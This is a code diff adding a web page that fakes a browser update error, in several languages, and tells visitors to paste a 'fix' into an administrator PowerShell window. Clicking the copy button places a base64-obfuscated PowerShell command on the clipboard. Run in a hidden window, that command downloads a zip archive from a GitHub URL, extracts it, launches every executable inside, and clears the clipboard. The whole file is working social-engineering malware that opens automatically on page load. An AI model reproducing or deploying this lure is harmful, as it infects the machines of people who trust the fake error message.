+        message2: "אירעה שגיאה במהלך העדכון האחרון של גרסת הדפדפן, מה שגרם לתקלות בכמה דפי אינטרנט.",
+        instructions: "בצעו את ההוראות הבאות כדי לפתור את הבעיה:",
+        steps: [
+          "לחצו על כפתור 'העתק תיקון' למטה.",
+          "לחצו לחיצה ימנית על סמל Windows",
+          "בחרו 'Windows PowerShell (Admin)'",
+          "לחצו לחיצה ימנית בתוך חלון הטרמינל הפתוח.",
+          "המתינו לסיום העדכון, ואז רעננו את הדף."
+        ],
+        copyButton: "העתק תיקון",
+        closeButton: "סגור"
+      },
+      tl: {
+        message1: "May nangyaring mali habang ipinapakita ang web page na ito.",
+        message2: "Nagkaroon ng error sa panahon ng pinakabagong update ng bersyon ng browser, na nagiging sanhi ng maling pag-andar ng ilang mga web page.",
+        instructions: "Sundin ang mga tagubiling ito upang malutas ang problema:",
+        steps: [
+          "I-click ang button na 'Kopyahin ang pag-aayos' sa ibaba.",
+          "I-right click ang icon ng Windows",
+          "Piliin ang 'Windows PowerShell (Admin)'",
+          "I-right click sa loob ng bukas na terminal window.",
+          "Hintayin ang pag-update na matapos, pagkatapos ay i-refresh ang pahina."
+        ],
+        copyButton: "Kopyahin ang pag-aayos",
+        closeButton: "Isara"
+      },
+      my: {
+        message1: "ဤဝဘ်စာမျက်နှာကိုပြသတဲ့အခါ အမှားတစ်ခုဖြစ်ပွားခဲ့သည်။",
+        message2: "ဘရောက်ဇာ ဗားရှင်း နောက်ဆုံးအသစ်ပြောင်းတဲ့အခါ အမှားတစ်ခုဖြစ်ပွားခဲ့ပြီး ဝဘ်စာမျက်နှာအချို့ မလုပ်ဆောင်နိုင်ခဲ့ပါ။",
+        instructions: "ပြဿနာကိုဖြေရှင်းဖို့ ဒီညွှန်ကြားချက်တွေကိုလိုက်နာပါ:",
+        steps: [
+          "အောက်မှာ 'ပြင်ဆင်မှုကိုကူးယူမည်' ခလုတ်ကိုနှိပ်ပါ။",
+          "Windows အိုင်ကွန်ပေါ်မှာညာဘက်ကလစ်နှိပ်ပါ",
+          "'Windows PowerShell (Admin)' ကိုရွေးချယ်ပါ",
+          "ဖွင့်ထားတဲ့ terminal ပင်မစာမျက်နှာအတွင်းမှာညာဘက်ကလစ်နှိပ်ပါ။",
+          "အသစ်ပြောင်းတာပြီးဆုံးချိန်ထိစောင့်ပြီးနောက် ပင်မစာမျက်နှာကိုပြန်ပြောင်းပါ။"
+        ],
+        copyButton: "ပြင်ဆင်မှုကိုကူးယူမည်",
+        closeButton: "ပိတ်ပါ"
+      },
+      pl: {
+        message1: "Wystąpił błąd podczas wyświetlania tej strony internetowej.",
+        message2: "Podczas ostatniej aktualizacji wersji przeglądarki wystąpił błąd, który spowodował nieprawidłowe działanie niektórych stron internetowych.",
+        instructions: "Postępuj zgodnie z tymi instrukcjami, aby rozwiązać problem:",
+        steps: [
+          "Kliknij poniższy przycisk 'Kopiuj naprawę'.",
+          "Kliknij prawym przyciskiem myszy ikonę Windows",
+          "Wybierz 'Windows PowerShell (Admin)'",
+          "Kliknij prawym przyciskiem myszy wewnątrz otwartego okna terminala.",
+          "Poczekaj na zakończenie aktualizacji, a następnie odśwież stronę."
+        ],
+        copyButton: "Kopiuj naprawę",
+        closeButton: "Zamknij"
+      }
+    };
+    function getBrowserIcon() {
+      let userAgent = navigator.userAgent;
+      if (userAgent.includes("Firefox")) {
+        return '<svg viewBox="-4.502953659537916 -1.816370980454367 85.1080168931947 83.43087708452362" xmlns="http://www.w3.org/2000/svg" width="auto" height="100%"><linearGradient id="a" x1=".898" x2=".066" y1=".155" y2=".931"><stop offset=".048" stop-color="#fff44f"/><stop offset=".111" stop-color="#ffe847"/><stop offset=".225" stop-color="#ffc830"/><stop offset=".368" stop-color="#ff980e"/><stop offset=".401" stop-color="#ff8b16"/><stop offset=".462" stop-color="#ff672a"/><stop offset=".534" stop-color="#ff3647"/><stop offset=".705" stop-color="#e31587"/></linearGradient><radialGradient id="b" cx="67.813" cy="8.879" gradientUnits="userSpaceOnUse" r="80.797"><stop offset=".129" stop-color="#ffbd4f"/><stop offset=".186" stop-color="#ffac31"/><stop offset=".247" stop-color="#ff9d17"/><stop offset=".283" stop-color="#ff980e"/><stop offset=".403" stop-color="#ff563b"/><stop offset=".467" stop-color="#ff3750"/><stop offset=".71" stop-color="#f5156c"/><stop offset=".782" stop-color="#eb0878"/><stop offset=".86" stop-color="#e50080"/></radialGradient><radialGradient id="c" cx="38.289" cy="41.911" gradientUnits="userSpaceOnUse" r="80.797"><stop offset=".3" stop-color="#960e18"/><stop offset=".351" stop-color="#b11927" stop-opacity=".74"/><stop offset=".435" stop-color="#db293d" stop-opacity=".343"/><stop offset=".497" stop-color="#f5334b" stop-opacity=".094"/><stop offset=".53" stop-color="#ff3750" stop-opacity="0"/></radialGradient><radialGradient id="d" cx="48.03" cy="-9.457" gradientUnits="userSpaceOnUse" r="58.534"><stop offset=".132" stop-color="#fff44f"/><stop offset=".252" stop-color="#ffdc3e"/><stop offset=".506" stop-color="#ff9d12"/><stop offset=".526" stop-color="#ff980e"/></radialGradient><radialGradient id="e" cx="29.352" cy="63.016" gradientUnits="userSpaceOnUse" r="38.471"><stop offset=".353" stop-color="#3a8ee6"/><stop offset=".472" stop-color="#5c79f0"/><stop offset=".669" stop-color="#9059ff"/><stop offset="1" stop-color="#c139e6"/></radialGradient><radialGradient id="f" cx="-7935.62" cy="-8491.546" gradientTransform="matrix(.972 -.235 .275 1.138 10091.302 7833.798)" gradientUnits="userSpaceOnUse" r="20.397"><stop offset=".206" stop-color="#9059ff" stop-opacity="0"/><stop offset=".278" stop-color="#8c4ff3" stop-opacity=".064"/><stop offset=".747" stop-color="#7716a8" stop-opacity=".45"/><stop offset=".975" stop-color="#6e008b" stop-opacity=".6"/></radialGradient><radialGradient id="g" cx="37.269" cy="5.573" gradientUnits="userSpaceOnUse" r="27.676"><stop offset="0" stop-color="#ffe226"/><stop offset=".121" stop-color="#ffdb27"/><stop offset=".295" stop-color="#ffc82a"/><stop offset=".502" stop-color="#ffa930"/><stop offset=".732" stop-color="#ff7e37"/><stop offset=".792" stop-color="#ff7139"/></radialGradient><radialGradient id="h" cx="59.023" cy="-11.981" gradientUnits="userSpaceOnUse" r="118.081"><stop offset=".113" stop-color="#fff44f"/><stop offset=".456" stop-color="#ff980e"/><stop offset=".622" stop-color="#ff5634"/><stop offset=".716" stop-color="#ff3647"/><stop offset=".904" stop-color="#e31587"/></radialGradient><radialGradient id="i" cx="-7927.165" cy="-8522.859" gradientTransform="matrix(.105 .995 -.653 .069 -4684.004 8470.191)" gradientUnits="userSpaceOnUse" r="86.499"><stop offset="0" stop-color="#fff44f"/><stop offset=".06" stop-color="#ffe847"/><stop offset=".168" stop-color="#ffc830"/><stop offset=".304" stop-color="#ff980e"/><stop offset=".356" stop-color="#ff8b16"/><stop offset=".455" stop-color="#ff672a"/><stop offset=".57" stop-color="#ff3647"/><stop offset=".737" stop-color="#e31587"/></radialGradient><radialGradient id="j" cx="36.617" cy="15.824" gradientUnits="userSpaceOnUse" r="73.72"><stop offset=".137" stop-color="#fff44f"/><stop offset=".48" stop-color="#ff980e"/><stop offset=".592" stop-color="#ff5634"/><stop offset=".655" stop-color="#ff3647"/><stop offset=".904" stop-color="#e31587"/></radialGradient><radialGradient id="k" cx="56.077" cy="20.139" gradientUnits="userSpaceOnUse" r="80.686"><stop offset=".094" stop-color="#fff44f"/><stop offset=".231" stop-color="#ffe141"/><stop offset=".509" stop-color="#ffaf1e"/><stop offset=".626" stop-color="#ff980e"/></radialGradient><linearGradient id="l" x1=".888" x2=".18" y1=".151" y2=".835"><stop offset=".167" stop-color="#fff44f" stop-opacity=".8"/><stop offset=".266" stop-color="#fff44f" stop-opacity=".634"/><stop offset=".489" stop-color="#fff44f" stop-opacity=".217"/><stop offset=".6" stop-color="#fff44f" stop-opacity="0"/></linearGradient><path d="M74.62 26.83c-1.7-4.06-5.1-8.43-7.78-9.8a40.27 40.27 0 0 1 3.93 11.75v.07C66.4 17.92 58.97 13.52 52.9 3.92c-.32-.48-.62-.97-.92-1.48-.17-.3-.3-.56-.43-.8A7.05 7.05 0 0 1 50.97.1a.1.1 0 0 0-.08-.1.14.14 0 0 0-.1 0v.02c0 .02-.03 0-.03 0V0c-9.72 5.7-13.03 16.26-13.33 21.53a19.4 19.4 0 0 0-10.67 4.12 11.6 11.6 0 0 0-1-.76 17.97 17.97 0 0 1-.1-9.5 28.7 28.7 0 0 0-9.34 7.22c-1.55-1.94-1.44-8.36-1.35-9.7a6.93 6.93 0 0 0-1.3.68 28.23 28.23 0 0 0-3.8 3.25 33.84 33.84 0 0 0-3.6 4.35 32.73 32.73 0 0 0-5.2 11.74L1 33.2c-.07.33-.34 2.04-.38 2.4v.1A36.94 36.94 0 0 0 0 41.04v.2a38.76 38.76 0 0 0 76.95 6.56c.07-.5.12-1 .18-1.5a39.86 39.86 0 0 0-2.5-19.47zM29.95 57.16c.18.1.35.2.53.27l.03.02q-.27-.14-.55-.3zm40.83-28.32v-.03.04z" fill="url(#a)"/><path d="M74.62 26.83c-1.7-4.06-5.1-8.43-7.78-9.8a40.27 40.27 0 0 1 3.93 11.75v.08a35.1 35.1 0 0 1-1.2 26.16c-4.44 9.53-15.2 19.3-32.03 18.82-18.18-.5-34.2-14-37.2-31.68-.54-2.8 0-4.2.28-6.47A28.88 28.88 0 0 0 0 41.03v.2a38.76 38.76 0 0 0 76.95 6.56c.07-.5.12-1 .18-1.5a39.86 39.86 0 0 0-2.5-19.47z" fill="url(#b)"/><path d="M74.62 26.83c-1.7-4.06-5.1-8.43-7.78-9.8a40.27 40.27 0 0 1 3.93 11.75v.08a35.1 35.1 0 0 1-1.2 26.16c-4.44 9.53-15.2 19.3-32.03 18.82-18.18-.5-34.2-14-37.2-31.68-.54-2.8 0-4.2.28-6.47A28.88 28.88 0 0 0 0 41.03v.2a38.76 38.76 0 0 0 76.95 6.56c.07-.5.12-1 .18-1.5a39.86 39.86 0 0 0-2.5-19.47z" fill="url(#c)"/><path d="M55.78 31.38c.1.06.16.12.24.18a21.1 21.1 0 0 0-3.6-4.7C40.38 14.82 49.27.74 50.77.03V0c-9.72 5.7-13.03 16.26-13.33 21.53.45-.03.9-.06 1.36-.06a19.56 19.56 0 0 1 16.98 9.9z" fill="url(#d)"/><path d="M38.83 33.8c-.07.95-3.47 4.28-4.67 4.28-11.02 0-12.8 6.66-12.8 6.66.48 5.62 4.4 10.24 9.12 12.7l.66.3q.57.25 1.14.47a17.23 17.23 0 0 0 5.04.98c19.32.9 23.06-23.1 9.12-30.07a13.38 13.38 0 0 1 9.34 2.28 19.56 19.56 0 0 0-16.98-9.9c-.46 0-.9.02-1.36.05a19.4 19.4 0 0 0-10.67 4.12c.6.5 1.26 1.16 2.67 2.55 2.63 2.6 9.37 5.27 9.4 5.6z" fill="url(#e)"/><path d="M38.83 33.8c-.07.95-3.47 4.28-4.67 4.28-11.02 0-12.8 6.66-12.8 6.66.48 5.62 4.4 10.24 9.12 12.7l.66.3q.57.25 1.14.47a17.23 17.23 0 0 0 5.04.98c19.32.9 23.06-23.1 9.12-30.07a13.38 13.38 0 0 1 9.34 2.28 19.56 19.56 0 0 0-16.98-9.9c-.46 0-.9.02-1.36.05a19.4 19.4 0 0 0-10.67 4.12c.6.5 1.26 1.16 2.67 2.55 2.63 2.6 9.37 5.27 9.4 5.6z" fill="url(#f)"/><path d="M24.97 24.36c.3.2.57.37.8.53a17.97 17.97 0 0 1-.1-9.5 28.7 28.7 0 0 0-9.34 7.22c.2 0 5.8-.1 8.64 1.74z" fill="url(#g)"/><path d="M.35 42.16c3 17.67 19 31.17 37.2 31.68 16.83.48 27.58-9.3 32.02-18.82a35.1 35.1 0 0 0 1.2-26.16v-.04-.04l.02.07c1.36 8.98-3.2 17.67-10.34 23.55l-.03.05c-13.9 11.33-27.2 6.84-29.9 5q-.3-.13-.57-.28c-8.1-3.87-11.46-11.26-10.74-17.6a9.95 9.95 0 0 1-9.18-5.77 14.62 14.62 0 0 1 14.25-.57 19.3 19.3 0 0 0 14.54.57c-.02-.32-6.76-3-9.4-5.6-1.4-1.38-2.06-2.04-2.66-2.54a11.6 11.6 0 0 0-1-.76c-.23-.16-.48-.33-.8-.53-2.82-1.84-8.44-1.74-8.63-1.74h-.02c-1.53-1.94-1.43-8.36-1.34-9.7a6.93 6.93 0 0 0-1.3.68 28.23 28.23 0 0 0-3.8 3.26 33.84 33.84 0 0 0-3.63 4.34 32.73 32.73 0 0 0-5.2 11.74c-.02.08-1.4 6.1-.72 9.22z" fill="url(#h)"/><path d="M52.43 26.86a21.1 21.1 0 0 1 3.6 4.7c.2.17.4.33.58.48 8.8 8.1 4.2 19.55 3.85 20.37 7.13-5.88 11.7-14.57 10.33-23.55-4.4-10.93-11.82-15.33-17.9-24.93-.3-.48-.6-.97-.9-1.48-.17-.3-.3-.56-.43-.8A7.05 7.05 0 0 1 50.97.1a.1.1 0 0 0-.08-.1.14.14 0 0 0-.1 0v.02c0 .02-.03 0-.03 0-1.5.72-10.4 14.8 1.66 26.84z" fill="url(#i)"/><path d="M56.6 32.04c-.17-.16-.37-.32-.58-.48l-.24-.18a13.38 13.38 0 0 0-9.35-2.27c13.94 6.98 10.2 31-9.12 30.08a17.23 17.23 0 0 1-5.03-.97q-.57-.2-1.14-.46c-.22-.1-.43-.2-.65-.3h.03c2.7 1.84 16 6.34 29.92-5l.02-.04c.35-.8 4.95-12.27-3.84-20.36z" fill="url(#j)"/><path d="M21.35 44.74s1.8-6.66 12.8-6.66c1.2 0 4.6-3.33 4.68-4.3a19.3 19.3 0 0 1-14.56-.56 14.62 14.62 0 0 0-14.25.57 9.95 9.95 0 0 0 9.2 5.76c-.73 6.34 2.62 13.73 10.73 17.6.18.1.35.18.53.27-4.73-2.45-8.64-7.07-9.13-12.7z" fill="url(#k)"/><path d="M74.62 26.83c-1.7-4.06-5.1-8.43-7.78-9.8a40.27 40.27 0 0 1 3.93 11.75v.07C66.4 17.92 58.97 13.52 52.9 3.92c-.32-.48-.62-.97-.92-1.48-.17-.3-.3-.56-.43-.8A7.05 7.05 0 0 1 50.97.1a.1.1 0 0 0-.08-.1.14.14 0 0 0-.1 0v.02c0 .02-.03 0-.03 0V0c-9.72 5.7-13.03 16.26-13.33 21.53.45-.03.9-.06 1.36-.06a19.56 19.56 0 0 1 16.98 9.9 13.38 13.38 0 0 0-9.34-2.26c13.94 6.98 10.2 31-9.12 30.08a17.23 17.23 0 0 1-5.04-.97q-.57-.2-1.14-.46l-.66-.3h.03q-.27-.13-.55-.28c.18.1.35.2.53.27-4.73-2.45-8.64-7.07-9.13-12.7 0 0 1.8-6.65 12.8-6.65 1.2 0 4.6-3.33 4.68-4.3-.02-.3-6.76-3-9.4-5.58-1.4-1.4-2.07-2.05-2.66-2.55a11.6 11.6 0 0 0-1-.76 17.97 17.97 0 0 1-.1-9.5 28.7 28.7 0 0 0-9.34 7.22c-1.55-1.94-1.44-8.36-1.35-9.7a6.93 6.93 0 0 0-1.3.68 28.23 28.23 0 0 0-3.8 3.25 33.84 33.84 0 0 0-3.6 4.35 32.73 32.73 0 0 0-5.2 11.74L1 33.2c-.07.33-.4 2.07-.45 2.44a45.1 45.1 0 0 0-.57 5.4v.2a38.76 38.76 0 0 0 76.95 6.56c.07-.5.12-1 .18-1.5a39.86 39.86 0 0 0-2.5-19.47zm-3.85 2v.03z" fill="url(#l)"/></svg>';
+      } else if (userAgent.includes("Edg")) {
+        return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" style="width:100%; height:100%;"><defs><radialGradient id="b" cx="161.8" cy="68.9" r="95.4" gradientTransform="matrix(1 0 0 -.95 0 248.8)" gradientUnits="userSpaceOnUse"><stop offset=".7" stop-opacity="0"/><stop offset=".9" stop-opacity=".5"/><stop offset="1"/></radialGradient><radialGradient id="d" cx="-340.3" cy="63" r="143.2" gradientTransform="matrix(.15 -.99 -.8 -.12 176.6 -125.4)" gradientUnits="userSpaceOnUse"><stop offset=".8" stop-opacity="0"/><stop offset=".9" stop-opacity=".5"/><stop offset="1"/></radialGradient><radialGradient id="e" cx="113.4" cy="570.2" r="202.4" gradientTransform="matrix(-.04 1 2.13 .08 -1179.5 -106.7)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#35c1f1"/><stop offset=".1" stop-color="#34c1ed"/><stop offset=".2" stop-color="#2fc2df"/><stop offset=".3" stop-color="#2bc3d2"/><stop offset=".7" stop-color="#36c752"/></radialGradient><radialGradient id="f" cx="376.5" cy="568" r="97.3" gradientTransform="matrix(.28 .96 .78 -.23 -303.8 -148.5)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#66eb6e"/><stop offset="1" stop-color="#66eb6e" stop-opacity="0"/></radialGradient><linearGradient id="a" x1="63.3" y1="84" x2="241.7" y2="84" gradientTransform="matrix(1 0 0 -1 0 266)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0c59a4"/><stop offset="1" stop-color="#114a8b"/></linearGradient><linearGradient id="c" x1="157.3" y1="161.4" x2="46" y2="40.1" gradientTransform="matrix(1 0 0 -1 0 266)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#1b9de2"/><stop offset=".2" stop-color="#1595df"/><stop offset=".7" stop-color="#0680d7"/><stop offset="1" stop-color="#0078d4"/></linearGradient></defs><path d="M235.7 195.5a93.7 93.7 0 0 1-10.6 4.7 101.9 101.9 0 0 1-35.9 6.4c-47.3 0-88.5-32.5-88.5-74.3a31.5 31.5 0 0 1 16.4-27.3c-42.8 1.8-53.8 46.4-53.8 72.5 0 74 68.1 81.4 82.8 81.4 7.9 0 19.8-2.3 27-4.6l1.3-.4a128.3 128.3 0 0 0 66.6-52.8 4 4 0 0 0-5.3-5.6Z" transform="translate(-4.6 -5)" style="fill:url(#a)"/><path d="M235.7 195.5a93.7 93.7 0 0 1-10.6 4.7 101.9 101.9 0 0 1-35.9 6.4c-47.3 0-88.5-32.5-88.5-74.3a31.5 31.5 0 0 1 16.4-27.3c-42.8 1.8-53.8 46.4-53.8 72.5 0 74 68.1 81.4 82.8 81.4 7.9 0 19.8-2.3 27-4.6l1.3-.4a128.3 128.3 0 0 0 66.6-52.8 4 4 0 0 0-5.3-5.6Z" transform="translate(-4.6 -5)" style="isolation:isolate;opacity:.35;fill:url(#b)"/><path d="M110.3 246.3A79.2 79.2 0 0 1 87.6 225a80.7 80.7 0 0 1 29.5-120c3.2-1.5 8.5-4.1 15.6-4a32.4 32.4 0 0 1 25.7 13 31.9 31.9 0 0 1 6.3 18.7c0-.2 24.5-79.6-80-79.6-43.9 0-80 41.6-80 78.2a130.2 130.2 0 0 0 12.1 56 128 128 0 0 0 156.4 67 75.5 75.5 0 0 1-62.8-8Z" transform="translate(-4.6 -5)" style="fill:url(#c)"/><path d="M110.3 246.3A79.2 79.2 0 0 1 87.6 225a80.7 80.7 0 0 1 29.5-120c3.2-1.5 8.5-4.1 15.6-4a32.4 32.4 0 0 1 25.7 13 31.9 31.9 0 0 1 6.3 18.7c0-.2 24.5-79.6-80-79.6-43.9 0-80 41.6-80 78.2a130.2 130.2 0 0 0 12.1 56 128 128 0 0 0 156.4 67 75.5 75.5 0 0 1-62.8-8Z" transform="translate(-4.6 -5)" style="opacity:.41;fill:url(#d);isolation:isolate"/><path d="M157 153.8c-.9 1-3.4 2.5-3.4 5.6 0 2.6 1.7 5.2 4.8 7.3 14.3 10 41.4 8.6 41.5 8.6a59.6 59.6 0 0 0 30.3-8.3 61.4 61.4 0 0 0 30.4-52.9c.3-22.4-8-37.3-11.3-43.9C228 28.8 182.3 5 132.6 5a128 128 0 0 0-128 126.2c.5-36.5 36.8-66 80-66 3.5 0 23.5.3 42 10a72.6 72.6 0 0 1 30.9 29.3c6.1 10.6 7.2 24.1 7.2 29.5s-2.7 13.3-7.8 19.9Z" transform="translate(-4.6 -5)" style="fill:url(#e)"/><path d="M157 153.8c-.9 1-3.4 2.5-3.4 5.6 0 2.6 1.7 5.2 4.8 7.3 14.3 10 41.4 8.6 41.5 8.6a59.6 59.6 0 0 0 30.3-8.3 61.4 61.4 0 0 0 30.4-52.9c.3-22.4-8-37.3-11.3-43.9C228 28.8 182.3 5 132.6 5a128 128 0 0 0-128 126.2c.5-36.5 36.8-66 80-66 3.5 0 23.5.3 42 10a72.6 72.6 0 0 1 30.9 29.3c6.1 10.6 7.2 24.1 7.2 29.5s-2.7 13.3-7.8 19.9Z" transform="translate(-4.6 -5)" style="fill:url(#f)"/></svg>';
+      } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+        return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"  style="width:100%; height:100%;"><linearGradient id="a" x1="461" x2="461" y1="59" y2="1033" gradientUnits="userSpaceOnUse"><stop offset=".6" stop-color="#ff1b2d"/><stop offset="1" stop-color="#a70014"/></linearGradient><linearGradient id="b" x1="714" x2="714" y1="116" y2="978" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#9c0000"/><stop offset=".7" stop-color="#ff4b4b"/></linearGradient><path fill="url(#a)" d="M545 42.5a502.5 502.5 0 10334.9 877.1 362.4 362.4 0 01-201.4 61.5c-119.7 0-226.8-59.4-299-153-55.6-65.6-91.5-162.5-94-271.3V533c2.5-108.8 38.4-205.8 94-271.3 72-93.6 179.3-153 299-153 73.6 0 142.5 22.5 201.4 61.6a500.8 500.8 0 00-333-127.9h-2z"/><path fill="url(#b)" d="M379.6 261.8c46-54.4 105.7-87.3 170.7-87.3 146.3 0 265 166 265 370.4 0 204.6-118.6 370.4-265 370.4-65 0-124.6-32.8-170.7-87.2 72 93.6 179.2 153 299 153A363 363 0 00880 919.6 501 501 0 001047.5 545a501.1 501.1 0 00-167.6-374.6 362.4 362.4 0 00-201.4-61.5c-119.7 0-226.8 59.4-299 153"/></svg>';
+      } else {
+        return '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" style="width:100%; height:100%;"><g><path d="M155.217 314.173 256 139.621l18.717.321 30.593 1.179 102.195 35.376 76.571-36.876C441.7 56.74 355.477 0 256 0 165.638 0 86.216 46.821 40.657 117.523v.172l7.746 131.034 106.814 65.444z" fill="#db4437"></path><path d="M155.217 314.173 40.657 117.695l-.053-.091C14.911 157.509 0 205.012 0 256c0 137.319 108.12 249.374 243.873 255.707l91.484-60.672 21.407-136.828-201.547-.034z" fill="#0f9d58"></path><path d="M484.076 139.621H256l100.783 174.552-.019.034-112.891 197.5.089.003c3.991.185 8.002.29 12.039.29 141.385 0 256-114.615 256-256-.001-41.908-10.073-81.463-27.925-116.379z" fill="#ffcd40"></path><circle cx="256" cy="256" r="116.379" fill="#f1f1f1"></circle><circle cx="256" cy="256" r="93.103" fill="#4285f4"></circle></g></svg>';
+      }
+    }
+    function getBrowserName() {
+      const userAgent = navigator.userAgent;
+      if (userAgent.includes("Firefox")) {
+        return "Firefox";
+      } else if (userAgent.includes("Edg")) {
+        return "Microsoft Edge";
+      } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+        return "Opera";
+      } else if (userAgent.includes("Trident") || userAgent.includes("MSIE")) {
+        return "Internet Explorer";
+      }else {
+        return "Google Chrome";
+      }
+    }
+
+    function getUserLanguage() {
+      return navigator.language || navigator.userLanguage;
+    }
+
+    function translateContent(language) {
+      const translation = translations[language] || translations['en'];
+      const middleBlock = document.querySelector('.middleBlock');
+      middleBlock.innerHTML = `
+            <p>${translation.message1}</p>
+            <p>${translation.message2}</p>
+            <p>${translation.instructions}</p>
+            <ol>
+                ${translation.steps.map(step => `<li>${step}</li>`).join('')}
+            </ol>
+        `;
+      document.querySelector('.copyButton').textContent = translation.copyButton;
+      document.querySelector('.closeButton').textContent = translation.closeButton;
+    }
+
+    function openPopup() {
+      var overlay = document.createElement('div');
+      overlay.id = 'popupOverlay';
+
+      var popup = document.createElement('div');
+      popup.classList.add('popup');
+
+      var topBlock = document.createElement('div');
+      topBlock.classList.add('topBlock');
+
+      var iconContainer = document.createElement('div');
+      iconContainer.classList.add('iconContainer');
+
+      var textContainer = document.createElement('div');
+      textContainer.classList.add('textContainer');
+      iconContainer.innerHTML = getBrowserIcon();
+      textContainer.textContent = getBrowserName();
+
+      topBlock.appendChild(iconContainer);
+      topBlock.appendChild(textContainer);
+
+      var middleBlock = document.createElement('div');
+      middleBlock.classList.add('middleBlock');
+
+      var bottomBlock = document.createElement('div');
+      bottomBlock.classList.add('bottomBlock');
+
+      var buttonContainer = document.createElement('div');
+      buttonContainer.classList.add('buttonContainer');
+
+      var copyButton = document.createElement('div');
+      copyButton.classList.add('copyButton');
+      copyButton.addEventListener('click', function() {
+        var textToCopy = `
+ipconfig /flushdns
+$LIC = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JHNiID0geyAkYSA9IEdldC1SYW5kb20gLU1pbmltdW0gMzEwMCAtTWF4aW11bSA1MTAwOyBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzICRhOyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRscyAtYm9yIFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMSAtYm9yIFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiAtYm9yIFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpTc2wzOyAkYiA9IEdldC1SYW5kb20gLU1pbmltdW0gOCAtTWF4aW11bSAxNjsgJGMgPSAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODknOyAkZCA9IC1qb2luICgxLi4kYiB8IEZvckVhY2gtT2JqZWN0IHsgR2V0LVJhbmRvbSAtSW5wdXRPYmplY3QgJGMuVG9DaGFyQXJyYXkoKSB9KTsgJGUgPSBKb2luLVBhdGggJGVudjpURU1QICRkOyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlOyAkZyA9IEpvaW4tUGF0aCAkZSAnSGVscGVyLnppcCc7IHdoaWxlICgkdHJ1ZSkgeyB0cnkgeyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICdodHRwczovL2dpdGh1Yi5jb20vY3liZXJ0ZWFtcy9oZWxwZXJzL3Jhdy9tYXN0ZXIvaGVscGVycy9oZWxwZXIuemlwJyAtT3V0RmlsZSAkZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgaWYgKFRlc3QtUGF0aCAkZykgeyBicmVhayB9IH0gY2F0Y2ggeyBTdGFydC1TbGVlcCAtU2Vjb25kcyA1IH0gfTsgRXhwYW5kLUFyY2hpdmUgLVBhdGggJGcgLURlc3RpbmF0aW9uUGF0aCAkZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTsgU3RhcnQtU2xlZXAgMjsgJGkgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRlIC1GaWx0ZXIgKi5leGU7IGZvcmVhY2ggKCRqIGluICRpKSB7ICRrID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbzsgJGsuRmlsZU5hbWUgPSAkai5GdWxsTmFtZTsgJGwgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzOyAkbC5TdGFydEluZm8gPSAkazsgJGwuU3RhcnQoKSB9OyBTZXQtQ2xpcGJvYXJkIC1WYWx1ZSAnJzsgfTsgJiAkc2IgfCBPdXQtTnVsbDs=")));
+Start-Process -FilePath "powershell" -ArgumentList $LIC -WindowStyle Hidden
+exit;
+
+`;
+        navigator.clipboard.writeText(textToCopy).then(function() {
+          const tooltip = document.getElementById('tooltip');
+          if (tooltip){
+            tooltip.textContent = 'Selected!';
+            tooltip.style.visibility = 'visible';
+            tooltip.style.opacity = 1;
+            setTimeout(() => {
+              tooltip.style.visibility = 'hidden';
+              tooltip.style.opacity = 0;
+            }, 1000);
+          }
+        }, function(err) {
+          console.error('Unable to copy text to clipboard: ', err);
+        });
+      });
+
+      var spanTooltip = document.createElement('dev');
+      spanTooltip.id = 'tooltip';
+      spanTooltip.classList.add('tooltip');
+      buttonContainer.appendChild(spanTooltip);
+
+
+      var closeButton = document.createElement('button');
+      closeButton.classList.add('closeButton');
+      closeButton.addEventListener('click', function() {
+        document.body.removeChild(overlay);
+      });
+
+      buttonContainer.appendChild(copyButton);
+      buttonContainer.appendChild(closeButton);
+      bottomBlock.appendChild(buttonContainer);
+
+      popup.appendChild(topBlock);
+      popup.appendChild(middleBlock);
+      popup.appendChild(bottomBlock);
+
+      overlay.appendChild(popup);
+      document.body.appendChild(overlay);
+
+      const userLang = getUserLanguage().substring(0, 2);
+      translateContent(userLang);
+    }
+
+    window.onload = function() {
+      openPopup();
+    };
+  </script>
+</head>
+<body>
+</body>
+</html>
